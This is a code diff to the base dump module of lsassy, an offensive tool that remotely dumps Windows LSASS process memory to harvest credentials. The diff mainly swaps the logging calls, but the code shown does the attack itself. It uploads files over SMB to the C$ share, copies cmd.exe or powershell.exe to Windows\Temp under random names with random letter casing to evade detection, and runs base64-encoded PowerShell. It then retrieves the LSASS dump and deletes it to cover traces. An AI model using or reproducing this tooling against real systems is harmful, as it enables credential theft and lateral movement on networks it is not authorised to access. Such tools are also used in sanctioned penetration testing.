@@ -6,7 +6,7 @@ import string
 import time
 
 from lsassy.impacketfile import ImpacketFile
-from lsassy import logger
+from lsassy.logger import lsassy_logger
 
 
 class CustomBuffer:
@@ -37,7 +37,7 @@ class Dependency:
         self.uploaded = False
         self.content = content
         self.share_mode = False
-        self.logger = logger.LsassyLogger()
+        
 
     def get_remote_path(self):
         return self.remote_path + self.file
@@ -49,7 +49,7 @@ class Dependency:
         self.path = options.get("{}_path".format(self.name), self.path)
 
         if not self.path:
-            self.logger.error("Missing {}_path".format(self.name))
+            lsassy_logger.error("Missing {}_path".format(self.name))
             return None
 
         if self.path.startswith('\\\\'):
@@ -59,7 +59,7 @@ class Dependency:
             self.share_mode = True
             return True
         if not os.path.exists(self.path):
-            self.logger.error("{} does not exist.".format(self.path))
+            lsassy_logger.error("{} does not exist.".format(self.path))
             return None
 
         return True
@@ -71,7 +71,7 @@ class Dependency:
             return True
 
         if self.content is None:
-            self.logger.debug('Copy {} to {}'.format(self.path, self.remote_path))
+            lsassy_logger.debug('Copy {} to {}'.format(self.path, self.remote_path))
             with open(self.path, 'rb') as p:
                 try:
                     session.smb_session.putFile(self.remote_share, self.remote_path + self.file, p.read)
@@ -79,11 +79,11 @@ class Dependency:
                     self.uploaded = True
                     return True
                 except Exception as e:
-                    self.logger.error("{} upload error".format(self.name), exc_info=True)
+                    lsassy_logger.error("{} upload error".format(self.name), exc_info=True)
                     return None
         else:
             if not ImpacketFile.create_file(session, self.remote_share, self.remote_path, self.file, self.content):
-                self.logger.error("{} upload error".format(self.name), exc_info=True)
+                lsassy_logger.error("{} upload error".format(self.name), exc_info=True)
                 return None
             print("{} uploaded".format(self.name))
             self.uploaded = True
@@ -121,13 +121,13 @@ class IDumpMethod:
         self._executor_copied = False
         self._timeout = timeout
         self._time_between_commands = time_between_commands
-        self.logger = logger.LsassyLogger()
+        
 
     def get_exec_method(self, exec_method, no_powershell=False):
         try:
             exec_method = importlib.import_module("lsassy.exec.{}".format(exec_method.lower()), "Exec").Exec(self._session)
         except ModuleNotFoundError:
-            self.logger.error("Exec module '{}' doesn't exist".format(exec_method.lower()), exc_info=True)
+            lsassy_logger.error("Exec module '{}' doesn't exist".format(exec_method.lower()), exc_info=True)
             return None
 
         if not self.need_debug_privilege or exec_method.debug_privilege:
@@ -174,7 +174,7 @@ class IDumpMethod:
         self._executor_name = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8)) + "." + random.choice(IDumpMethod.ext)
         self._executor_path = "\\Windows\\Temp\\"
         try:
-            self.logger.info("Opening {}".format(executor))
+            lsassy_logger.info("Opening {}".format(executor))
             buff = CustomBuffer()
             self._session.smb_session.getFile("C$", executor_locations[executor], buff.write)
             self._session.smb_session.putFile("C$", self._executor_path + self._executor_name, buff.read)
@@ -182,7 +182,7 @@ class IDumpMethod:
             self._executor_copied = True
             return True
         except Exception as e:
-            self.logger.debug("An error occurred while copying {}".format(executor), exc_info=True)
+            lsassy_logger.debug("An error occurred while copying {}".format(executor), exc_info=True)
             self._executor_path = ""
             self._executor_name = executor + ".exe"
             return None
@@ -190,17 +190,17 @@ class IDumpMethod:
     def executor_clean(self):
         if self._executor_copied:
             ImpacketFile.delete(self._session, self._executor_path + self._executor_name, timeout=self._timeout)
-            self.logger.debug("Executor copy deleted")
+            lsassy_logger.debug("Executor copy deleted")
 
     def build_exec_command(self, commands, exec_method, no_powershell=False, copy=False):
-        self.logger.debug("Building command - Exec Method has seDebugPrivilege: {} | seDebugPrivilege needed: {} | Powershell allowed: {} | Copy executor: {}".format(exec_method.debug_privilege, self.need_debug_privilege, not no_powershell, copy))
+        lsassy_logger.debug("Building command - Exec Method has seDebugPrivilege: {} | seDebugPrivilege needed: {} | Powershell allowed: {} | Copy executor: {}".format(exec_method.debug_privilege, self.need_debug_privilege, not no_powershell, copy))
         if commands["cmd"] is not None and (not self.need_debug_privilege or exec_method.debug_privilege):
             if not isinstance(commands["cmd"], list):
                 commands["cmd"] = [commands["cmd"]]
             self._executor_name = 'cmd.exe'
             if copy:
                 self.executor_copy('cmd')
-            self.logger.debug(commands["cmd"])
+            lsassy_logger.debug(commands["cmd"])
             executor_commands = ["""/Q /c {}""".format(command) for command in commands["cmd"]]
         elif commands["pwsh"] is not None and not no_powershell:
             if not isinstance(commands["pwsh"], list):
@@ -208,24 +208,24 @@ class IDumpMethod:
             self._executor_name = 'powershell.exe'
             if copy:
                 self.executor_copy('powershell')
-            self.logger.debug(commands["pwsh"])
+            lsassy_logger.debug(commands["pwsh"])
             executor_commands = ["-NoP -Enc {}".format(base64.b64encode(command.encode('UTF-16LE')).decode("utf-8")) for command in commands["pwsh"]]
         else:
-            self.logger.error("Shouldn't fall here. Incompatible constraints")
+            lsassy_logger.error("Shouldn't fall here. Incompatible constraints")
             return None
 
         self._executor_name = ''.join(random.choice([str.upper, str.lower])(c) for c in self._executor_name)
         return ["{}{} {}".format(self._executor_path, self._executor_name, command) for command in executor_commands]
 
     def dump(self, dump_path=None, dump_name=None, no_powershell=False, copy=False, exec_methods=None, **kwargs):
-        self.logger.info("Dumping via {}".format(self.__module__))
+        lsassy_logger.info("Dumping via {}".format(self.__module__))
         if exec_methods is not None:
             self.exec_methods = exec_methods
 
         if dump_name is not None:
             if not self.custom_dump_name_support:
-                self.logger.warning("A custom dump name was provided, but dump method {} doesn't support custom dump name".format(self.__module__))
-                self.logger.warning("Dump file will be {}".format(self.dump_name))
+                lsassy_logger.warning("A custom dump name was provided, but dump method {} doesn't support custom dump name".format(self.__module__))
+                lsassy_logger.warning("Dump file will be {}".format(self.dump_name))
             else:
                 self.dump_name = dump_name
         elif self.dump_name == "":
@@ -238,43 +238,45 @@ class IDumpMethod:
 
         if dump_path is not None:
             if not self.custom_dump_path_support:
-                self.logger.warning("A custom dump path was provided, but dump method {} doesn't support custom dump path".format(self.__module__))
-                self.logger.warning("Dump path will be {}{}".format(self.dump_share, self.dump_path))
+                lsassy_logger.warning("A custom dump path was provided, but dump method {} doesn't support custom dump path".format(self.__module__))
+                lsassy_logger.warning("Dump path will be {}{}".format(self.dump_share, self.dump_path))
             else:
                 self.dump_path = dump_path
 
         valid_exec_methods = {}
         for e in self.exec_methods:
             exec_method = self.get_exec_method(e, no_powershell)
-            if exec_method is not None:
+            lsassy_logger.debug(f"Exec method: {exec_method}")
+            if exec_method is not None and exec_method not in valid_exec_methods:
                 valid_exec_methods[e] = exec_method
             else:
-                self.logger.debug("Exec method '{}' is not compatible".format(e))
+                lsassy_logger.debug("Exec method '{}' is not compatible".format(e))
+        lsassy_logger.debug(f"Exec Methods: {valid_exec_methods}")
 
         if len(valid_exec_methods) == 0:
-            self.logger.error("Current dump constrains cannot be fulfilled")
-            self.logger.debug("Dump class: {} (Need SeDebugPrivilege: {})".format(self.__module__, self.need_debug_privilege))
-            self.logger.debug("Exec methods: {}".format(self.exec_methods))
-            self.logger.debug("Powershell allowed: {}".format("No" if no_powershell else "Yes"))
+            lsassy_logger.error("Current dump constrains cannot be fulfilled")
+            lsassy_logger.debug("Dump class: {} (Need SeDebugPrivilege: {})".format(self.__module__, self.need_debug_privilege))
+            lsassy_logger.debug("Exec methods: {}".format(self.exec_methods))
+            lsassy_logger.debug("Powershell allowed: {}".format("No" if no_powershell else "Yes"))
             return None
 
         if self.prepare(kwargs) is None:
-            self.logger.error("Module prerequisites could not be processed")
+            lsassy_logger.error("Module prerequisites could not be processed")
             self.clean()
             return None
 
         try:
             commands = self.get_commands()
         except NotImplementedError:
-            self.logger.warning("Module '{}' hasn't implemented all required methods".format(self.__module__))
+            lsassy_logger.warning("Module '{}' hasn't implemented all required methods".format(self.__module__))
             return None
 
         if not isinstance(commands, dict) or "cmd" not in commands or "pwsh" not in commands:
-            self.logger.warning("Return value of {} was not expected. Expecting {'cmd':'...', 'pwsh':'...'}")
+            lsassy_logger.warning("Return value of {} was not expected. Expecting {'cmd':'...', 'pwsh':'...'}")
             return None
 
         for e, exec_method in valid_exec_methods.items():
-            self.logger.info("Trying {} method".format(e))
+            lsassy_logger.info("Trying {} method".format(e))
             exec_commands = self.build_exec_command(commands, exec_method, no_powershell, copy)
             if exec_commands is None:
                 # Shouldn't fall there, but if we do, just skip to next execution method
@@ -285,24 +287,24 @@ class IDumpMethod:
                     if not first_execution:
                         time.sleep(self._time_between_commands)
                     first_execution = False
-                    self.logger.debug("Transformed command: {}".format(exec_command))
+                    lsassy_logger.debug("Transformed command: {}".format(exec_command))
                     res = exec_method.exec(exec_command)
                     self.executor_clean()
                 self.clean()
             except Exception:
-                self.logger.error("Execution method {} has failed".format(exec_method.__module__), exc_info=True)
+                lsassy_logger.error("Execution method {} has failed".format(exec_method.__module__), exc_info=True)
                 continue
             if not res:
-                self.logger.error("Failed to dump lsass using {}".format(e))
+                lsassy_logger.error("Failed to dump lsass using {}".format(e))
                 continue
             self._file_handle = self._file.open(self.dump_share, self.dump_path, self.dump_name, timeout=self._timeout)
             if self._file_handle is None:
-                self.logger.error("Failed to dump lsass using {}".format(e))
+                lsassy_logger.error("Failed to dump lsass using {}".format(e))
                 continue
-            print("Lsass dumped in C:{}{} ({} Bytes)".format(self.dump_path, self.dump_name, self._file_handle.size()))
+            lsassy_logger.info("Lsass dumped in C:{}{} ({} Bytes)".format(self.dump_path, self.dump_name, self._file_handle.size()))
             return self._file_handle
             
-        self.logger.error("All execution methods have failed")
+        lsassy_logger.error("All execution methods have failed")
         self.clean()
         return None
 
@@ -314,12 +316,12 @@ class IDumpMethod:
             else:
                 try:
                     self._session.smb_session.deleteFile(self.dump_share, self.dump_path + "/" + self.dump_name)
-                    self.logger.debug("Lsass dump deleted")
+                    lsassy_logger.debug("Lsass dump deleted")
                 except Exception as e:
                     if "STATUS_OBJECT_NAME_NOT_FOUND" in str(e) or "STATUS_NO_SUCH_FILE" in str(e):
                         return True
                     if time.time() - t > timeout:
-                        self.logger.warning("Lsass dump wasn't removed in {}{}".format(self.dump_share, self.dump_path + "/" + self.dump_name), exc_info=True)
+                        lsassy_logger.warning("Lsass dump wasn't removed in {}{}".format(self.dump_share, self.dump_path + "/" + self.dump_name), exc_info=True)
                         return None
-                    self.logger.debug("Unable to delete lsass dump file {}{}. Retrying...".format(self.dump_share, self.dump_path + "/" + self.dump_name))
+                    lsassy_logger.debug("Unable to delete lsass dump file {}{}. Retrying...".format(self.dump_share, self.dump_path + "/" + self.dump_name))
                     time.sleep(0.5)
